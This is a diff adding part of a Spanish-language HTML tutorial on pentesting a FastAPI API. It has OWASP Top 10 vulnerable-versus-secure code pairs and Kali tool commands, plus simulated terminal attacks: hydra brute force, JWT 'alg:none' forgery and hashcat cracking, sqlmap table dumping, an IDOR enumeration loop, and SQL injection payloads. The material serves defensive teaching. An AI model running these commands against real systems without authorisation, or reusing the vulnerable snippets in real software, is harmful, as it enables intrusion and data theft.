+        <text x="730" y="210" text-anchor="middle" font-family="Share Tech Mono" font-size="8" fill="rgba(79,195,247,0.4)">Port 5432 · internal only</text>
+
+        <!-- Redis cache -->
+        <rect x="650" y="310" width="160" height="55" rx="2" fill="rgba(79,195,247,0.02)" stroke="rgba(79,195,247,0.15)" stroke-width="1"/>
+        <text x="730" y="337" text-anchor="middle" font-family="Share Tech Mono" font-size="10" fill="rgba(79,195,247,0.5)">Redis / Cache</text>
+        <text x="730" y="353" text-anchor="middle" font-family="Share Tech Mono" font-size="8" fill="rgba(79,195,247,0.3)">Sessions · Rate limit data</text>
+
+        <!-- CONNECTIONS -->
+        <!-- attacker → nginx -->
+        <path d="M 108 180 L 200 150" stroke="rgba(255,63,63,0.5)" stroke-width="1.5" stroke-dasharray="5,3" marker-end="url(#arrow-red)"/>
+        <!-- user → nginx -->
+        <path d="M 108 340 L 200 300" stroke="rgba(232,230,223,0.15)" stroke-width="1" marker-end="url(#arrow-gray)"/>
+        <!-- nginx → fastapi -->
+        <path d="M 340 150 L 410 200" stroke="rgba(255,179,71,0.3)" stroke-width="1" marker-end="url(#arrow-amber)"/>
+        <!-- nginx → fastapi (user) -->
+        <path d="M 340 300 L 410 230" stroke="rgba(255,179,71,0.2)" stroke-width="1" stroke-dasharray="3,2"/>
+        <!-- fastapi → postgres -->
+        <path d="M 590 200 L 650 200" stroke="rgba(0,255,157,0.3)" stroke-width="1.5" marker-end="url(#arrow-green)"/>
+        <!-- fastapi → redis -->
+        <path d="M 590 230 L 630 337 L 650 337" stroke="rgba(0,255,157,0.15)" stroke-width="1" stroke-dasharray="3,2"/>
+
+        <!-- SQL injection attack path -->
+        <path d="M 108 190 Q 280 400 410 210" stroke="rgba(255,63,63,0.2)" stroke-width="1" stroke-dasharray="2,4" fill="none"/>
+        <text x="220" y="420" font-family="Share Tech Mono" font-size="7.5" fill="rgba(255,63,63,0.35)" letter-spacing="1">→ SQL Injection path</text>
+
+        <!-- Arrow markers -->
+        <defs>
+          <marker id="arrow-red" markerWidth="6" markerHeight="6" refX="5" refY="3" orient="auto">
+            <path d="M0,0 L0,6 L6,3 z" fill="rgba(255,63,63,0.7)"/>
+          </marker>
+          <marker id="arrow-amber" markerWidth="6" markerHeight="6" refX="5" refY="3" orient="auto">
+            <path d="M0,0 L0,6 L6,3 z" fill="rgba(255,179,71,0.5)"/>
+          </marker>
+          <marker id="arrow-green" markerWidth="6" markerHeight="6" refX="5" refY="3" orient="auto">
+            <path d="M0,0 L0,6 L6,3 z" fill="rgba(0,255,157,0.5)"/>
+          </marker>
+          <marker id="arrow-gray" markerWidth="6" markerHeight="6" refX="5" refY="3" orient="auto">
+            <path d="M0,0 L0,6 L6,3 z" fill="rgba(232,230,223,0.2)"/>
+          </marker>
+        </defs>
+
+        <!-- Legend -->
+        <rect x="20" y="420" width="860" height="80" rx="2" fill="rgba(255,255,255,0.01)" stroke="rgba(255,255,255,0.04)" stroke-width="1"/>
+        <text x="40" y="445" font-family="Share Tech Mono" font-size="8.5" fill="rgba(255,63,63,0.6)" letter-spacing="1">VECTORES DE ATAQUE PRINCIPALES:</text>
+        <text x="40" y="462" font-family="Share Tech Mono" font-size="8" fill="rgba(255,63,63,0.4)">• SQL Injection en params de endpoints</text>
+        <text x="40" y="477" font-family="Share Tech Mono" font-size="8" fill="rgba(255,63,63,0.4)">• JWT manipulation / Broken auth</text>
+        <text x="300" y="462" font-family="Share Tech Mono" font-size="8" fill="rgba(255,63,63,0.4)">• IDOR en IDs de recursos (/users/{id})</text>
+        <text x="300" y="477" font-family="Share Tech Mono" font-size="8" fill="rgba(255,63,63,0.4)">• Rate limiting bypass → DoS</text>
+        <text x="560" y="462" font-family="Share Tech Mono" font-size="8" fill="rgba(255,63,63,0.4)">• Directory traversal en file uploads</text>
+        <text x="560" y="477" font-family="Share Tech Mono" font-size="8" fill="rgba(255,63,63,0.4)">• Exposed /docs en producción</text>
+      </svg>
+    </div>
+  </div>
+</section>
+
+<!-- ════ OWASP TOP 10 ════ -->
+<section class="section" id="owasp" style="background:linear-gradient(to bottom,transparent,rgba(255,63,63,0.01),transparent)">
+  <div class="section-inner">
+    <p class="sec-label fade-in">// sección 03 — referencia mundial</p>
+    <h2 class="sec-h2 fade-in">OWASP <em>Top 10</em><br>2021 — Las vulnerabilidades</h2>
+    <p class="sec-sub fade-in">El estándar global. Cada empresa seria las conoce. Cada una tiene su versión en código Python real. Click para expandir cada vulnerabilidad.</p>
+
+    <div class="owasp-grid fade-in">
+
+      <!-- A01 -->
+      <div class="owasp-row" id="owasp-0">
+        <div class="owasp-rank">A01</div>
+        <div class="owasp-sev-bar sev-crit-bar"></div>
+        <div class="owasp-content">
+          <div class="owasp-name">Broken Access Control</div>
+          <div class="owasp-cat">Control de acceso roto — #1 desde 2021</div>
+        </div>
+        <div class="owasp-expand"><span class="owasp-tag-crit">CRÍTICO</span></div>
+      </div>
+      <div class="owasp-detail" id="detail-0">
+        <div class="owasp-detail-text">
+          <p>Un usuario puede acceder a recursos que no le pertenecen. El ejemplo más común: <code style="color:var(--red)">/api/users/42</code> devuelve el perfil del usuario 42 sin verificar si quien pregunta ES el usuario 42.</p>
+          <p style="margin-top:0.8rem">En FastAPI esto se llama <strong style="color:var(--white)">IDOR (Insecure Direct Object Reference)</strong>. Cambias el ID en la URL y ves datos de otro usuario.</p>
+          <p style="margin-top:0.8rem;font-family:var(--mono);font-size:0.7rem;color:var(--amber)">Cómo lo detecta un attacker:<br>GET /api/users/1 → OK<br>GET /api/users/2 → también OK? 🚨</p>
+        </div>
+        <div>
+          <div class="owasp-code">
+<span class="cm-code"># ❌ VULNERABLE</span>
+<span class="vl">@router.get("/users/{user_id}")</span>
+<span class="vl">async def get_user(user_id: int, db=Depends(get_db)):</span>
+<span class="vl">    return await db.get(User, user_id)  # sin auth!</span>
+
+<span class="cm-code"># ✅ SEGURO</span>
+<span class="gd">@router.get("/users/{user_id}")</span>
+<span class="gd">async def get_user(</span>
+<span class="gd">    user_id: int,</span>
+<span class="gd">    current_user = Depends(get_current_user),</span>
+<span class="gd">    db = Depends(get_db)</span>
+<span class="gd">):</span>
+<span class="gd">    if current_user.id != user_id and not current_user.is_admin:</span>
+<span class="gd">        raise HTTPException(403, "Acceso denegado")</span>
+<span class="gd">    return await db.get(User, user_id)</span>
+          </div>
+        </div>
+      </div>
+
+      <!-- A02 -->
+      <div class="owasp-row" id="owasp-1">
+        <div class="owasp-rank">A02</div>
+        <div class="owasp-sev-bar sev-crit-bar"></div>
+        <div class="owasp-content">
+          <div class="owasp-name">Cryptographic Failures</div>
+          <div class="owasp-cat">Datos sensibles en texto plano o cifrado débil</div>
+        </div>
+        <div class="owasp-expand"><span class="owasp-tag-crit">CRÍTICO</span></div>
+      </div>
+      <div class="owasp-detail" id="detail-1">
+        <div class="owasp-detail-text">
+          <p>Guardar contraseñas con MD5 o SHA-1, transmitir datos sensibles sin TLS, usar claves hardcodeadas en el código. Vimos esto en el capítulo anterior, pero aquí lo vemos desde el ángulo del atacante.</p>
+          <p style="margin-top:0.8rem;font-family:var(--mono);font-size:0.7rem;color:var(--amber)">Si roban tu DB y las contraseñas son MD5:<br>Una GPU rompe ~10 billones hashes/seg<br>Con bcrypt: ~4,000/seg → 2.5 millones x más seguro</p>
+        </div>
+        <div>
+          <div class="owasp-code">
+<span class="cm-code"># ❌ VULNERABLE</span>
+<span class="vl">import hashlib</span>
+<span class="vl">password_hash = hashlib.md5(password.encode()).hexdigest()</span>
+<span class="vl"># También peligroso: SHA1, SHA256 sin salt</span>
+
+<span class="cm-code"># ❌ VULNERABLE — hardcoded secret</span>
+<span class="vl">SECRET_KEY = "mysecretkey"  # en el código!</span>
+
+<span class="cm-code"># ✅ SEGURO</span>
+<span class="gd">from passlib.context import CryptContext</span>
+<span class="gd">pwd_context = CryptContext(schemes=["bcrypt"], rounds=12)</span>
+<span class="gd">password_hash = pwd_context.hash(password)</span>
+<span class="gd"># SECRET_KEY desde .env con 256 bits de entropía</span>
+          </div>
+        </div>
+      </div>
+
+      <!-- A03 -->
+      <div class="owasp-row" id="owasp-2">
+        <div class="owasp-rank">A03</div>
+        <div class="owasp-sev-bar sev-crit-bar"></div>
+        <div class="owasp-content">
+          <div class="owasp-name">Injection (SQL · NoSQL · Command)</div>
+          <div class="owasp-cat">Datos de usuario en queries sin sanitizar</div>
+        </div>
+        <div class="owasp-expand"><span class="owasp-tag-crit">CRÍTICO</span></div>
+      </div>
+      <div class="owasp-detail" id="detail-2">
+        <div class="owasp-detail-text">
+          <p>El clásico. Input del usuario se interpreta como código. En SQL: <code style="color:var(--red)">'; DROP TABLE users; --</code>. Con SQLAlchemy ORM estás protegido por defecto, pero text() queries son peligrosos.</p>
+          <p style="margin-top:0.8rem;font-family:var(--mono);font-size:0.7rem;color:var(--amber)">Payload clásico: <span style="color:var(--red)">' OR '1'='1</span><br>En un login vulnerable: accede sin contraseña</p>
+        </div>
+        <div>
+          <div class="owasp-code">
+<span class="cm-code"># ❌ VULNERABLE — SQL injection</span>
+<span class="vl">@router.get("/search")</span>
+<span class="vl">async def search(q: str, db=Depends(get_db)):</span>
+<span class="vl">    query = f"SELECT * FROM users WHERE name='{q}'"</span>
+<span class="vl">    return await db.execute(text(query))  # ☠️</span>
+
+<span class="cm-code"># ✅ SEGURO — ORM con parámetros</span>
+<span class="gd">@router.get("/search")</span>
+<span class="gd">async def search(q: str, db=Depends(get_db)):</span>
+<span class="gd">    # SQLAlchemy ORM — parámetros escapados automáticamente</span>
+<span class="gd">    result = await db.execute(</span>
+<span class="gd">        select(User).where(User.name == q)  # ✓ seguro</span>
+<span class="gd">    )</span>
+<span class="gd">    return result.scalars().all()</span>
+          </div>
+        </div>
+      </div>
+
+      <!-- A07 -->
+      <div class="owasp-row" id="owasp-3">
+        <div class="owasp-rank">A07</div>
+        <div class="owasp-sev-bar sev-high-bar"></div>
+        <div class="owasp-content">
+          <div class="owasp-name">Identification & Authentication Failures</div>
+          <div class="owasp-cat">Autenticación rota — tokens, sesiones, contraseñas débiles</div>
+        </div>
+        <div class="owasp-expand"><span class="owasp-tag-high">ALTO</span></div>
+      </div>
+      <div class="owasp-detail" id="detail-3">
+        <div class="owasp-detail-text">
+          <p>JWT sin expiración, endpoints sin autenticación requerida, aceptar el algoritmo "none" en JWT, no revocar tokens al logout, no limitar intentos de login.</p>
+          <p style="margin-top:0.8rem;font-family:var(--mono);font-size:0.7rem;color:var(--amber)">Un JWT sin exp puede usarse para siempre.<br>Si se filtra: acceso permanente hasta cambiar SECRET_KEY.</p>
+        </div>
+        <div>
+          <div class="owasp-code">
+<span class="cm-code"># ❌ JWT sin expiración</span>
+<span class="vl">payload = {"sub": user.id}  # sin "exp"!</span>
+<span class="vl">token = jwt.encode(payload, SECRET, "HS256")</span>
+
+<span class="cm-code"># ❌ Aceptar cualquier algoritmo</span>
+<span class="vl">jwt.decode(token, SECRET, algorithms=["*"])</span>
+
+<span class="cm-code"># ✅ SEGURO</span>
+<span class="gd">payload = {</span>
+<span class="gd">    "sub": str(user.id),</span>
+<span class="gd">    "exp": datetime.utcnow() + timedelta(minutes=30),</span>
+<span class="gd">    "iat": datetime.utcnow(),</span>
+<span class="gd">    "jti": str(uuid4()),  # unique token ID</span>
+<span class="gd">}</span>
+<span class="gd">jwt.decode(token, SECRET, algorithms=["HS256"])  # explícito</span>
+          </div>
+        </div>
+      </div>
+
+      <!-- A05 -->
+      <div class="owasp-row" id="owasp-4">
+        <div class="owasp-rank">A05</div>
+        <div class="owasp-sev-bar sev-high-bar"></div>
+        <div class="owasp-content">
+          <div class="owasp-name">Security Misconfiguration</div>
+          <div class="owasp-cat">Docs expuestas, debug mode, CORS abierto</div>
+        </div>
+        <div class="owasp-expand"><span class="owasp-tag-high">ALTO</span></div>
+      </div>
+      <div class="owasp-detail" id="detail-4">
+        <div class="owasp-detail-text">
+          <p>FastAPI genera /docs y /redoc automáticamente — perfectos para desarrollo, peligrosos en producción. CORS con allow_origins=["*"] permite cualquier dominio hacer requests autenticadas.</p>
+          <p style="margin-top:0.8rem;font-family:var(--mono);font-size:0.7rem;color:var(--amber)">Un atacante busca /docs en producción primero.<br>Encuentra todos tus endpoints documentados y los prueba.</p>
+        </div>
+        <div>
+          <div class="owasp-code">
+<span class="cm-code"># ❌ VULNERABLE — producción con docs</span>
+<span class="vl">app = FastAPI()  # docs_url="/docs" por defecto</span>
+<span class="vl">add_middleware(CORSMiddleware, allow_origins=["*"])</span>
+
+<span class="cm-code"># ✅ SEGURO — producción</span>
+<span class="gd">import os</span>
+<span class="gd">IS_PROD = os.getenv("ENV") == "production"</span>
+
+<span class="gd">app = FastAPI(</span>
+<span class="gd">    docs_url=None if IS_PROD else "/docs",</span>
+<span class="gd">    redoc_url=None if IS_PROD else "/redoc",</span>
+<span class="gd">    openapi_url=None if IS_PROD else "/openapi.json",</span>
+<span class="gd">)</span>
+<span class="gd">add_middleware(CORSMiddleware,</span>
+<span class="gd">    allow_origins=["https://tudominio.com"])  # específico</span>
+          </div>
+        </div>
+      </div>
+
+    </div>
+  </div>
+</section>
+
+<!-- ════ HERRAMIENTAS DE KALI ════ -->
+<section class="section" id="herramientas">
+  <div class="section-inner">
+    <p class="sec-label fade-in">// sección 04 — arsenal</p>
+    <h2 class="sec-h2 fade-in">Kali Linux —<br>El <em>arsenal</em> del pentester</h2>
+    <p class="sec-sub fade-in">600+ herramientas preinstaladas. Estas son las esenciales para empezar. Cada una con un comando concreto para testear tu FastAPI.</p>
+
+    <div class="tools-grid">
+      <div class="kali-card fade-in">
+        <div class="kali-icon">🗺</div>
+        <div class="kali-cat">Reconocimiento / Escaneo</div>
+        <div class="kali-name">NMAP</div>
+        <p class="kali-desc">Network mapper. Descubre puertos abiertos, servicios y versiones. Primera herramienta en cualquier pentest.</p>
+        <div class="kali-cmd">$ nmap -sV -sC -p- tudominio.com<br><span style="color:var(--gray)"># -sV: versiones · -sC: scripts · -p-: todos los puertos</span></div>
+        <span class="kali-status status-legal">LEGAL</span>
+      </div>
+
+      <div class="kali-card fade-in">
+        <div class="kali-icon">🕸</div>
+        <div class="kali-cat">Web App Testing</div>
+        <div class="kali-name">BURP SUITE</div>
+        <p class="kali-desc">Proxy de interceptación HTTP. Captura, modifica y repite requests. El estándar para pentesting web. Versión Community es gratuita.</p>
+        <div class="kali-cmd">$ java -jar burpsuite_community.jar<br><span style="color:var(--gray)"># Configura proxy en 127.0.0.1:8080</span></div>
+        <span class="kali-status status-legal">GRATUITO</span>
+      </div>
+
+      <div class="kali-card fade-in">
+        <div class="kali-icon">📡</div>
+        <div class="kali-cat">Análisis de Red</div>
+        <div class="kali-name">WIRESHARK</div>
+        <p class="kali-desc">Captura y analiza tráfico de red en tiempo real. Verifica que tu FastAPI nunca envíe datos sensibles sin cifrar.</p>
+        <div class="kali-cmd">$ wireshark -i eth0 -f "port 8000"<br><span style="color:var(--gray)"># Captura todo el tráfico de tu API</span></div>
+        <span class="kali-status status-legal">SOLO TU RED</span>
+      </div>
+
+      <div class="kali-card fade-in">
+        <div class="kali-icon">🔍</div>
+        <div class="kali-cat">Fuzzing / Descubrimiento</div>
+        <div class="kali-name">GOBUSTER / FFUF</div>
+        <p class="kali-desc">Fuerza bruta de directorios y endpoints. Descubre rutas ocultas, archivos de config expuestos, y APIs no documentadas.</p>
+        <div class="kali-cmd">$ ffuf -u http://localhost:8000/FUZZ \<br>&nbsp;&nbsp;&nbsp;&nbsp;-w /usr/share/wordlists/dirb/common.txt<br><span style="color:var(--gray)"># Busca /admin, /debug, /config, /backup...</span></div>
+        <span class="kali-status status-legal">ENTORNO PROPIO</span>
+      </div>
+
+      <div class="kali-card fade-in">
+        <div class="kali-icon">💉</div>
+        <div class="kali-cat">SQL Injection</div>
+        <div class="kali-name">SQLMAP</div>
+        <p class="kali-desc">Automatiza la detección y explotación de SQL injection. En 2 segundos sabe si un endpoint es vulnerable. Úsalo en tu propio código antes del deploy.</p>
+        <div class="kali-cmd">$ sqlmap -u "http://localhost:8000/api/search?q=test" \<br>&nbsp;&nbsp;&nbsp;&nbsp;--dbs --level=3<br><span style="color:var(--gray)"># Detecta inyección automáticamente</span></div>
+        <span class="kali-status status-careful">CON PERMISO</span>
+      </div>
+
+      <div class="kali-card fade-in">
+        <div class="kali-icon">⚡</div>
+        <div class="kali-cat">Frameworks</div>
+        <div class="kali-name">METASPLOIT</div>
+        <p class="kali-desc">El framework de explotación más usado en el mundo. Módulos para miles de vulnerabilidades conocidas (CVEs). Para red teamers avanzados.</p>
+        <div class="kali-cmd">$ msfconsole<br>msf6 > search type:exploit platform:linux<br><span style="color:var(--gray)"># Base de datos de exploits actualizados</span></div>
+        <span class="kali-status status-careful">SOLO LAB</span>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- ════ TERMINAL ATTACK SIMULATIONS ════ -->
+<section class="terminal-section" id="ataques">
+  <div class="section-inner">
+    <p class="sec-label">// sección 05 — ataques en terminal</p>
+    <h2 class="sec-h2 fade-in">Así se ve un <em>ataque real</em><br>contra tu API</h2>
+    <p class="sec-sub fade-in">Simulaciones reales de lo que un atacante haría contra tu FastAPI. Todo esto — con permiso — tú deberías hacer tú mismo primero.</p>
+  </div>
+
+  <div style="margin-top:3rem">
+    <div class="terminal-tabs">
+      <div class="t-tab active" data-ttab="recon">1. Reconocimiento</div>
+      <div class="t-tab" data-ttab="enum">2. Enumeración API</div>
+      <div class="t-tab" data-ttab="auth">3. Auth Testing</div>
+      <div class="t-tab" data-ttab="injection">4. SQL Injection</div>
+      <div class="t-tab" data-ttab="idor">5. IDOR Attack</div>
+    </div>
+
+    <div class="t-pane active" id="ttab-recon">
+      <div class="term-win">
+        <div class="term-head"><div class="tdot r"></div><div class="tdot y"></div><div class="tdot g"></div><span class="ttitle">attacker@kali:~$ — Fase 1: Reconocimiento pasivo</span></div>
+        <div class="term-body">
+<div><span class="tp">attacker@kali</span><span class="tdim">:~$</span> <span class="tc">whois tudominio.com</span></div>
+<div class="tout">&nbsp;&nbsp;Registrant: Tu Nombre</div>
+<div class="tout">&nbsp;&nbsp;Server: DigitalOcean LLC — 165.xx.xx.xx</div>
+<br>
+<div><span class="tp">attacker@kali</span><span class="tdim">:~$</span> <span class="tc">nmap -sV -p 80,443,8000,5432 165.xx.xx.xx</span></div>
+<div class="tout">&nbsp;&nbsp;PORT&nbsp;&nbsp;&nbsp;&nbsp; STATE  SERVICE  VERSION</div>
+<div class="tout">&nbsp;&nbsp;80/tcp&nbsp;&nbsp; open&nbsp;&nbsp; http&nbsp;&nbsp;&nbsp;&nbsp; nginx 1.24</div>
+<div class="tout">&nbsp;&nbsp;443/tcp&nbsp; open&nbsp;&nbsp; https&nbsp;&nbsp;&nbsp; nginx 1.24</div>
+<div class="thigh">&nbsp;&nbsp;8000/tcp open&nbsp;&nbsp; http&nbsp;&nbsp;&nbsp;&nbsp; uvicorn <span class="tred">← ¡puerto expuesto!</span></div>
+<div class="tred">&nbsp;&nbsp;5432/tcp open&nbsp;&nbsp; postgresql <span class="tred">← ¡DB pública!</span></div>
+<br>
+<div><span class="tp">attacker@kali</span><span class="tdim">:~$</span> <span class="tc">curl http://165.xx.xx.xx:8000/docs</span></div>
+<div class="tred">&nbsp;&nbsp;{"openapi":"3.0.2","info":{"title":"CipherDoc API"...</div>
+<div class="tred">&nbsp;&nbsp;<span style="color:var(--red)">↑ Documentación expuesta en producción. Todos los endpoints visibles.</span></div>
+<br>
+<div><span class="tp">attacker@kali</span><span class="tdim">:~$</span> <span class="tc">curl http://165.xx.xx.xx:8000/openapi.json | python3 -m json.tool</span></div>
+<div class="thigh">&nbsp;&nbsp;Endpoints encontrados: /api/v1/users, /api/v1/auth/login,</div>
+<div class="thigh">&nbsp;&nbsp;/api/v1/admin/users, /api/v1/files/upload ...</div>
+<br>
+<div><span class="tp">attacker@kali</span><span class="tdim">:~$</span> <span class="tc"># LECCIÓN: cerrar puerto 8000, deshabilitar /docs en prod, firewall en 5432</span></div>
+<div class="tdim">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="tcursor"></span></div>
+        </div>
+      </div>
+    </div>
+
+    <div class="t-pane" id="ttab-enum">
+      <div class="term-win">
+        <div class="term-head"><div class="tdot r"></div><div class="tdot y"></div><div class="tdot g"></div><span class="ttitle">attacker@kali:~$ — Fase 2: Enumeración de endpoints</span></div>
+        <div class="term-body">
+<div><span class="tp">attacker@kali</span><span class="tdim">:~$</span> <span class="tc">ffuf -u http://localhost:8000/api/v1/FUZZ -w wordlist.txt</span></div>
+<br>
+<div class="tout">&nbsp;&nbsp;[Status: 200] users</div>
+<div class="tout">&nbsp;&nbsp;[Status: 200] auth/login</div>
+<div class="thigh">&nbsp;&nbsp;[Status: 200] admin        <span class="tred">← ¿debería ser accesible?</span></div>
+<div class="thigh">&nbsp;&nbsp;[Status: 200] health       <span class="tdim">← info del sistema</span></div>
+<div class="tout">&nbsp;&nbsp;[Status: 405] users/export <span class="tdim">← existe pero método incorrecto</span></div>
+<br>
+<div><span class="tp">attacker@kali</span><span class="tdim">:~$</span> <span class="tc">curl -X GET http://localhost:8000/api/v1/admin</span></div>
+<div class="tred">&nbsp;&nbsp;{"users": [{"id":1,"email":"admin@domain.com","role":"admin"},...</div>
+<div class="tred">&nbsp;&nbsp;↑ ¡Sin autenticación! Datos de todos los usuarios visibles.</div>
+<br>
+<div><span class="tp">attacker@kali</span><span class="tdim">:~$</span> <span class="tc">curl http://localhost:8000/api/v1/health</span></div>
+<div class="thigh">&nbsp;&nbsp;{"status":"ok","db":"postgresql 15.2","python":"3.11.3","os":"Linux 6.1"}</div>
+<div class="tdim">&nbsp;&nbsp;↑ Fingerprinting completo. Atacante ya sabe qué CVEs buscar.</div>
+<br>
+<div><span class="tp">attacker@kali</span><span class="tdim">:~$</span> <span class="tcursor"></span></div>
+        </div>
+      </div>
+    </div>
+
+    <div class="t-pane" id="ttab-auth">
+      <div class="term-win">
+        <div class="term-head"><div class="tdot r"></div><div class="tdot y"></div><div class="tdot g"></div><span class="ttitle">attacker@kali:~$ — Fase 3: Auth Testing</span></div>
+        <div class="term-body">
+<div><span class="tp">attacker@kali</span><span class="tdim">:~$</span> <span class="tc"># Test 1: Brute force login (sin rate limiting)</span></div>
+<div><span class="tp">attacker@kali</span><span class="tdim">:~$</span> <span class="tc">hydra -l admin@domain.com -P rockyou.txt http-post-form \</span></div>
+<div><span class="tc">&nbsp;&nbsp;&nbsp;&nbsp;"/api/v1/auth/login:username=^USER^&password=^PASS^:401"</span></div>
+<div class="thigh">&nbsp;&nbsp;[80][http-post-form] host: localhost</div>
+<div class="tred">&nbsp;&nbsp;login: admin@domain.com  password: password123  ← encontrada en 4min</div>
+<br>
+<div><span class="tp">attacker@kali</span><span class="tdim">:~$</span> <span class="tc"># Test 2: JWT algorithm confusion</span></div>
+<div><span class="tc">&nbsp;&nbsp;# Decodificar JWT (base64, no cifrado)</span></div>
+<div><span class="tc">&nbsp;&nbsp;echo "eyJhbGci..." | base64 -d</span></div>
+<div class="tout">&nbsp;&nbsp;{"alg":"HS256","typ":"JWT"}</div>
+<div><span class="tc">&nbsp;&nbsp;# Cambiar alg a "none" y reenviar sin firma</span></div>
+<div><span class="tc">&nbsp;&nbsp;echo '{"alg":"none"}' | base64 | tr -d '=' | tr '+/' '-_'</span></div>
+<div class="tred">&nbsp;&nbsp;↑ Si el servidor acepta alg:none → acceso sin clave secreta</div>
+<br>
+<div><span class="tp">attacker@kali</span><span class="tdim">:~$</span> <span class="tc"># Test 3: JWT brute force (clave débil)</span></div>
+<div><span class="tc">&nbsp;&nbsp;hashcat -a 0 -m 16500 token.jwt rockyou.txt</span></div>
+<div class="thigh">&nbsp;&nbsp;Token: eyJhbGci...  →  Secret found: "secret"  ←</div>
+<div class="tred">&nbsp;&nbsp;Con la clave: firmas propios JWT con cualquier user_id.</div>
+<br>
+<div><span class="tp">attacker@kali</span><span class="tdim">:~$</span> <span class="tcursor"></span></div>
+        </div>
+      </div>
+    </div>
+
+    <div class="t-pane" id="ttab-injection">
+      <div class="term-win">
+        <div class="term-head"><div class="tdot r"></div><div class="tdot y"></div><div class="tdot g"></div><span class="ttitle">attacker@kali:~$ — Fase 4: SQL Injection testing</span></div>
+        <div class="term-body">
+<div><span class="tp">attacker@kali</span><span class="tdim">:~$</span> <span class="tc"># Test manual: inyección básica</span></div>
+<div><span class="tc">&nbsp;&nbsp;curl "http://localhost:8000/api/search?q=test'"</span></div>
+<div class="tred">&nbsp;&nbsp;{"detail":"sqlalchemy.exc.ProgrammingError: (psycopg2...) unterminated..."}</div>
+<div class="tred">&nbsp;&nbsp;↑ ¡Error de DB expuesto! Confirma SQL injection Y fingerprinting.</div>
+<br>
+<div><span class="tp">attacker@kali</span><span class="tdim">:~$</span> <span class="tc"># Test con SQLMap automático</span></div>
+<div><span class="tc">&nbsp;&nbsp;sqlmap -u "http://localhost:8000/api/search?q=test" \</span></div>
+<div><span class="tc">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; --dbms=postgresql --dbs --dump</span></div>
+<br>
+<div class="thigh">&nbsp;&nbsp;[INFO] testing 'PostgreSQL boolean-based blind'</div>
+<div class="thigh">&nbsp;&nbsp;[INFO] testing 'PostgreSQL time-based blind'</div>
+<div class="tred">&nbsp;&nbsp;[CRITICAL] Parameter 'q' is vulnerable to SQL injection</div>
+<div class="tred">&nbsp;&nbsp;Available databases: [public]</div>
+<div class="tred">&nbsp;&nbsp;Tables: users, tokens, payments, admin_logs</div>
+<br>
+<div class="tout">&nbsp;&nbsp;Dumping table 'users'...</div>
+<div class="tred">&nbsp;&nbsp;id | email           | hashed_password | is_admin</div>
+<div class="tred">&nbsp;&nbsp;1  | admin@domain.com | $2b$12$...      | true</div>
+<div class="tred">&nbsp;&nbsp;2  | alice@domain.com | $2b$12$...      | false</div>
+<div class="tdim">&nbsp;&nbsp;↑ bcrypt los salvó — aunque tiene los hashes, tardaría años en romperlos</div>
+<br>
+<div><span class="tp">attacker@kali</span><span class="tdim">:~$</span> <span class="tcursor"></span></div>
+        </div>
+      </div>
+    </div>
+
+    <div class="t-pane" id="ttab-idor">
+      <div class="term-win">
+        <div class="term-head"><div class="tdot r"></div><div class="tdot y"></div><div class="tdot g"></div><span class="ttitle">attacker@kali:~$ — Fase 5: IDOR (Insecure Direct Object Reference)</span></div>
+        <div class="term-body">
+<div><span class="tp">attacker@kali</span><span class="tdim">:~$</span> <span class="tc"># Me logueo con mi cuenta legítima</span></div>
+<div><span class="tc">&nbsp;&nbsp;TOKEN=$(curl -s -X POST localhost:8000/api/v1/auth/login \</span></div>
+<div><span class="tc">&nbsp;&nbsp;&nbsp;&nbsp;-d "username=attacker&password=mypass" | jq -r '.access_token')</span></div>
+<br>
+<div><span class="tp">attacker@kali</span><span class="tdim">:~$</span> <span class="tc"># Mi user_id es 99. Intento acceder al 1 (admin)</span></div>
+<div><span class="tc">&nbsp;&nbsp;curl -H "Authorization: Bearer $TOKEN" localhost:8000/api/v1/users/1</span></div>
+<div class="tred">&nbsp;&nbsp;{"id":1,"email":"admin@domain.com","role":"admin","phone":"+1555..."}</div>
+<div class="tred">&nbsp;&nbsp;↑ ¡IDOR! Accedí al perfil del admin con mi token de usuario normal.</div>
+<br>
+<div><span class="tp">attacker@kali</span><span class="tdim">:~$</span> <span class="tc"># Script para extraer todos los usuarios</span></div>
+<div><span class="tc">&nbsp;&nbsp;for id in $(seq 1 1000); do</span></div>
+<div><span class="tc">&nbsp;&nbsp;&nbsp;&nbsp;curl -s -H "Authorization: Bearer $TOKEN" \</span></div>
+<div><span class="tc">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;localhost:8000/api/v1/users/$id | jq '.email'</span></div>
+<div><span class="tc">&nbsp;&nbsp;done</span></div>
+<br>
+<div class="tred">&nbsp;&nbsp;"admin@domain.com"</div>
+<div class="tred">&nbsp;&nbsp;"alice@domain.com"</div>
+<div class="tred">&nbsp;&nbsp;"bob@domain.com" ...</div>
+<div class="tdim">&nbsp;&nbsp;→ 847 usuarios extraídos en 2 minutos. Filtración masiva de datos.</div>
+<br>
+<div><span class="tp">attacker@kali</span><span class="tdim">:~$</span> <span class="tcursor"></span></div>
+        </div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- ════ CÓDIGO: TESTS DE SEGURIDAD ════ -->
+<section class="code-section" id="codigo">
+  <div class="section-inner">
+    <p class="sec-label fade-in">// sección 06 — tus propias pruebas de seguridad</p>
+    <h2 class="sec-h2 fade-in">Escribe tus <em>security tests</em><br>con pytest</h2>
+    <p class="sec-sub fade-in">No esperes a que un auditor externo encuentre esto. Automatiza estas pruebas en tu CI/CD pipeline.</p>
+
+    <div class="code-tabs">
+      <div class="code-tab active" data-ctab="auth">test_auth.py</div>
+      <div class="code-tab" data-ctab="idor">test_idor.py</div>
+      <div class="code-tab" data-ctab="ratelimit">test_ratelimit.py</div>
+      <div class="code-tab" data-ctab="headers">test_headers.py</div>
+    </div>
+
+    <div class="code-pane active" id="ctab-auth">
+      <div class="code-block">
